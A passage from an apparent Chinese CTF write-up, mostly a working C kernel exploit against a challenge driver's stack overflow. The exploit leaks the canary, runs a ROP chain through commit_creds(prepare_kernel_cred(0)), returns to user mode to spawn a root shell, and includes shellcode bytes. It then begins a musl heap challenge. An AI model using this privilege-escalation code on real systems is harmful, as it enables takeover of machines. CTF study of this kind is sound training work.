</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">dev_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">kernel_stack</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">off</span> <span class="o">&gt;=</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* end of file */</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">kernel_stack</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="n">size</span> <span class="o">-</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="o">*</span><span class="n">off</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">kernel_stack</span> <span class="o">+</span> <span class="o">*</span><span class="n">off</span><span class="p">,</span> <span class="n">len</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">off</span> <span class="o">+=</span> <span class="n">len</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>启动脚本特意关掉了mmap_min_addr，所以直接mmap到0地址处，控制内容导致copy_to_user时造成内核栈溢出。cr4的gadget没得，只能在内核栈上提权了。</p>
<p>需要绕过canary、smep、KPTI，直接swapgs_restore_regs_and_return_to_usermode一把梭</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* x1do0 / Lilac */</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">trap_frame</span><span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">rip</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">cs</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">eflags</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">rsp</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ss</span><span class="p">;</span>
<span class="p">}</span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
<span class="k">struct</span> <span class="n">trap_frame</span> <span class="n">tf</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">tf_addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">tf</span><span class="p">;</span>
<span class="cp">#define KERNCALL __attribute__((regparm(3)))
</span><span class="cp"></span><span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="mh">0xffffffff810cc140</span><span class="p">;</span>
<span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">KERNCALL</span> <span class="o">=</span> <span class="mh">0xffffffff810cbdd0</span><span class="p">;</span>



<span class="kt">uint64_t</span> <span class="nf">u64</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">s</span><span class="p">){</span>
    <span class="kt">uint64_t</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">7</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span><span class="mi">0</span> <span class="p">;</span><span class="n">i</span><span class="o">--</span><span class="p">){</span>
        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x00000000000000ff</span> <span class="o">&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">init_tf_work</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="c1">//__asm__ volatile(&#34;.intel_syntax noprefix;&#34;
</span><span class="c1"></span>    <span class="c1">//    &#34;mov tf+8, cs;&#34;    //set cs
</span><span class="c1"></span>    <span class="c1">//    &#34;pushf;pop tf+16;&#34;       //set eflags
</span><span class="c1"></span>    <span class="c1">//    &#34;push rsp;pop tf+24;&#34;
</span><span class="c1"></span>    <span class="c1">//    &#34;mov tf+32, ss;&#34;);
</span><span class="c1"></span>    <span class="k">asm</span><span class="p">(</span>
        <span class="s">&#34;movq %%cs, %0</span><span class="se">\n</span><span class="s">&#34;</span>
        <span class="s">&#34;movq %%ss, %1</span><span class="se">\n</span><span class="s">&#34;</span>
        <span class="s">&#34;movq %%rsp, %3;</span><span class="se">\n</span><span class="s">&#34;</span>
        <span class="s">&#34;pushfq</span><span class="se">\n</span><span class="s">&#34;</span>
        <span class="s">&#34;popq %2</span><span class="se">\n</span><span class="s">&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">),</span> <span class="s">&#34;=r&#34;</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">)</span>
        <span class="o">:</span>
        <span class="o">:</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="n">tf</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
    <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span> <span class="o">-=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Reg saved cs = %llx, ss = %llx, flags = %llx, user_sp = %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">,</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">get_shell</span><span class="p">(){</span>
        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] mmap at 0x100000, ret %x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">mmap</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>  <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="p">);</span>
        <span class="kt">int</span> <span class="n">get_shell_64</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x81</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x8</span><span class="p">;</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] write shellocde&#34;</span><span class="p">);</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">get_shell_64</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span> <span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="mh">0x100000</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">get_shell_64</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="c1">// extern int errno;
</span><span class="c1"></span>        <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">fd2</span><span class="p">,</span> <span class="n">exp_fd</span><span class="p">;</span>
        <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/char_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="n">fd2</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/char_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="n">exp_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/char_dev&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>

        <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span>
        <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
        <span class="n">mem</span><span class="p">[</span><span class="mh">0x30</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\n&#39;</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x30</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>

        <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">);</span>
        <span class="n">mem</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\n&#39;</span><span class="p">;</span>
        <span class="c1">// printf(&#34;[*] %d\n&#34;, lseek(fd, 0x28, SEEK_SET));
</span><span class="c1"></span>        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">buffer</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="n">base</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0xcbdd0</span><span class="p">;</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0xffffffff8104dec1</span><span class="p">;</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0xffffffff8110f940</span><span class="p">;</span>
        <span class="c1">// long long iret = 0xffffffff81039a1b;
</span><span class="c1"></span>        <span class="c1">// long long swapgs = 0xffffffff81c00aaf;
</span><span class="c1"></span>        <span class="kt">long</span> <span class="kt">long</span> <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0xffffffff81020360</span><span class="p">;</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="n">swapgs_and_iret</span> <span class="o">=</span> <span class="mh">0xffffffff81c00a4a</span><span class="p">;</span>
        <span class="c1">// 0x0000000000000730 : pop rdi ; ret
</span><span class="c1"></span>        <span class="c1">// 0x00000000003d5380 : xchg rax, rdi ; ret
</span><span class="c1"></span>        <span class="c1">// 0x00000000000064ed : pop rsp ; ret
</span><span class="c1"></span>        <span class="c1">// printf(&#34;[*] %d\n&#34;, lseek(fd, 0, SEEK_SET));
</span><span class="c1"></span>
        <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="sc">&#39;\x00&#39;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
        <span class="n">mem</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\n&#39;</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">mem</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsp_ret</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xd00</span><span class="p">;</span>

        <span class="n">init_tf_work</span><span class="p">();</span>

        <span class="n">ropchain</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">mem</span> <span class="o">+</span> <span class="mh">0xd00</span><span class="p">);</span>
        <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget1</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">gadget2</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_and_iret</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">get_shell</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">cs</span><span class="p">;</span> <span class="c1">// tf.cs, tf.ss, tf.eflags, tf.rsp
</span><span class="c1"></span>        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">eflags</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">rsp</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">ss</span><span class="p">;</span>
        <span class="n">ropchain</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="n">exp_fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>
        <span class="c1">// system(&#34;/bin/sh&#34;);
</span><span class="c1"></span>
        <span class="c1">// ropchain[i++] = get_root;
</span><span class="c1"></span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="baby_musl">baby_musl</h2>
<p>给的是docker，看一下dockerfile，server就是拿ubuntu2004直接apt装的musl</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="c">#sudo docker build . -t test_chall</span><span class="err">
</span><span class="err"></span><span class="c">#sudo docker run -d -p 1024:1024 --rm -it test_chall</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">FROM</span><span class="s"> ubuntu:20.04</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctf<span class="err">
</span><span class="err"></span><span class="k">RUN</span> <span class="nb">echo</span> <span class="s2">&#34;ctf:ctf&#34;</span> <span class="p">|</span> chpasswd<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /home/ctf</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">COPY</span> baby_musl .<span class="err">
</span><span class="err"></span><span class="k">COPY</span> flag.txt .<span class="err">
</span><span class="err"></span><span class="k">COPY</span> ynetd .<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> chown -R root:root /home/ctf<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get -y dist-upgrade <span class="o">&amp;&amp;</span> apt-get -y install musl<span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">USER</span><span class="s"> ctf</span><span class="err">
</span><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 1024</span><span class="err">
</span><span class="err">
</span><span class="err"></span><span class="k">CMD</span> ./ynetd -p <span class="m">1024</span> ./baby_musl<span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>所以本地就拿2004做就行，musl libc版本信息如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">musl libc (x86_64)
Version 1.1.24
Dynamic Program Loader
Usage: /lib/x86_64-linux-musl/libc.so [options] [--] pathname [args]
</code></pre></td></tr></table>
</div>
</div><p>musl堆题，保护全开，有两个洞。</p>
<p>前面add的时候要求idx&lt;4，但show没检查idx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
